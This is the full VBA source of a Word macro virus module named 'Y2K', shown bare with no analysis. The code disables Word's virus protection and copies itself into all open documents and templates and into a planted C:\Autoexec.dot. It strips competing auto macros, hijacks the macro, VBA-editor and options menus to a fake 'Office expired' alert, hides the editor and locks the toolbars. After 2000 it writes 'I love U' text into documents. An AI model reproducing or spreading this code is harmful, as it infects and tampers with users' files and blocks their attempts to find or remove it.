   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Y2K"
   Sub actNo()
       MsgBox "ÄúµÄ Office Èí¼þÒÑ¾³¬¹ýÊ¹ÓÃÆÚÏÞ,ÇëÓëÎÒÃÇÁªÏµ:        " + Chr(13) + _
       Chr(13) + "                HTTP://home.microsoft.com" _
       , vbOKOnly + vbCritical, "Microsoft Word"
       For Each myTask In Tasks
           If InStr(myTask.Name, "Word") > 0 Then
               myTask.Visible = False
           End If
       Next myTask
   End Sub
   Sub Autos()
       Dim file$
       Dim ans$
       Dim test
       Dim mItem
       Dim cItem
       Dim aDoc
       Dim aTemp
       Dim vset
       Dim Iset
       Dim ad
       Dim y2kDate As Long
       Application.ScreenUpdating = False
       For Each ad In AddIns
       If ad.Name = "Autoexec.dot" Then
           ad.Installed = False
       End If
       Next ad
       With Dialogs(wdDialogToolsOptionsFileLocations)
       .Path = "STARTUP-PATH"
       .Setting = "c:\"
       .Execute
       End With
       If Options.VirusProtection Then
           Options.VirusProtection = False
       End If

       file$ = WordBasic.[MacroFileName$]()
       If InStr(file$, "Autoexec") <> 0 Then
           For Each aDoc In Documents
           For Each cItem In aDoc.VBProject.VBComponents
           If (cItem.Name = "Y2K") Then
               vset = 1
           End If
           Next cItem
           Next aDoc
           For Each cItem In NormalTemplate.VBProject.VBComponents
           If (cItem.Name = "Y2K") Then
               vset = 1
           End If
           Next cItem
           If vset <> 1 Then
           WordBasic.DisableAutoMacros
           Documents.Open FileName:="C:\Autoexec.dot", AddToRecentFiles:=False
           For Each aDoc In Documents
               If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                       WordBasic.MacroCopy ActiveDocument.FullName + ":Y2K", aDoc.FullName + ":Y2K"
               End If
           Next aDoc
           For Each aTemp In Templates
               If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                       WordBasic.MacroCopy ActiveDocument.FullName + ":Y2K", aTemp.FullName + ":Y2K"
               End If
           Next aTemp
           ActiveDocument.Save
           ActiveDocument.Close
           End If
           If vset = 1 Then
               GoTo out
           End If
       End If

       With Application.FileSearch
       .LookIn = "C:\"
       .FileName = "Autoexec.dot"
       If .Execute > 0 Then
             Iset = 1
       End If
       End With
       If Iset <> 1 Then
           WordBasic.DisableAutoMacros
           Documents.Add NewTemplate:=True
           WordBasic.MacroCopy file$ + ":Y2K", ActiveDocument.FullName + ":Y2K"
           ActiveDocument.SaveAs FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
           ActiveDocument.Close
       End If

       For Each aDoc In Documents
           If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
               For Each cItem In aDoc.VBProject.VBComponents
                   If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                       aDoc.VBProject.VBComponents.Remove (cItem)
                   End If
               Next cItem
           End If
       Next aDoc
       For Each aTemp In Templates
           If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
               For Each cItem In aTemp.VBProject.VBComponents
                   If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                       aTemp.VBProject.VBComponents.Remove (cItem)
                   End If
               Next cItem
           End If
       Next aTemp
       For Each aDoc In Documents
           If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                WordBasic.MacroCopy file$ + ":Y2K", aDoc.FullName + ":Y2K"
                aDoc.Save
           End If
       Next aDoc
       For Each aTemp In Templates
           If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                 WordBasic.MacroCopy file$ + ":Y2K", aTemp.FullName + ":Y2K"
           End If
       Next aTemp
   out:
   If InStr(file$, "Normal") = 0 Then

       CustomizationContext = NormalTemplate
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
       myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
       myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
          Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
       myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
       myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"

       For Each mItem In CommandBars("Tools").Controls
       If mItem.Caption = "×Ô¶¨Òå(&C)..." Then
           mItem.OnAction = "actno"
       End If
       If mItem.Caption = "Ä£°åºÍ¼ÓÔØÏî(&I)..." Then
           mItem.OnAction = "actno"
       End If
       If mItem.Caption = "Ñ¡Ïî(&O)..." Then
           mItem.OnAction = "actno"
       End If
       Next mItem
       For Each mItem In CommandBars("File").Controls
       If mItem.Caption = "ÐÂ½¨(&N)..." Then
           mItem.OnAction = "NewDoc"
       End If
       If mItem.Caption = "±£´æ(&S)" Then
           mItem.OnAction = "SaveDoc"
       End If
       Next mItem
       For Each cItem In CommandBars("Tools").Controls
       If cItem.Type = msoControlPopup Then
           If cItem.Caption = "ºê(&M)" Then
               For Each mItem In cItem.CommandBar.Controls
                   If mItem.Caption = "ºê(&M)..." Then
                       mItem.OnAction = "actno"
                   End If
                   If mItem.Caption = "Visual Basic ±à¼Æ÷(&V)" Then
                       mItem.OnAction = "actno"
                   End If
               Next mItem
           End If
       End If
       Next cItem
       For Each cItem In CommandBars("Visual Basic").Controls
       cItem.OnAction = "actno"
       Next cItem
       For Each cItem In CommandBars("Standard").Controls
       If cItem.Index = 1 Then
       cItem.OnAction = "NewDoc"
       End If
       If cItem.Index = 3 Then
       cItem.OnAction = "SaveDoc"
       End If
       Next cItem
       For Each cItem In CommandBars
       If cItem.Visible = True Then
           cItem.Protection = msoBarNoCustomize
       End If
       Next cItem
   End If
       For Each myTask In Tasks
           If InStr(myTask.Name, "Visual Basic") > 0 Then
               myTask.Visible = False
           End If
       Next myTask
   Application.ScreenUpdating = True

   Pun:
       y2kDate = Int(Now())
       On Error GoTo 0
       On Error GoTo en
       If y2kDate >= 36526 Then
           If y2kDate = 36826 Or (Rnd() * 100000 Mod 100) = 2 Then
               For i = 50 To 100
                   Selection.TypeParagraph
                   Selection.Font.ColorIndex = wdRed
                   Selection.Font.Size = i
                   Selection.TypeText Text:="I love U"
               Next i
           End If
       End If
   en:

   End Sub
   Sub AutoOpen()
   Autos
   End Sub
   Sub autoclose()
   Autos
   End Sub
   Sub autoNew()
   Autos
   End Sub
   Sub autoexec()
   Autos
   End Sub
   Sub NewDoc()
   Documents.Add Template:="", NewTemplate:=False
   Autos
   End Sub
   Sub SaveDoc()
   ActiveDocument.Save
   Autos
   End Sub
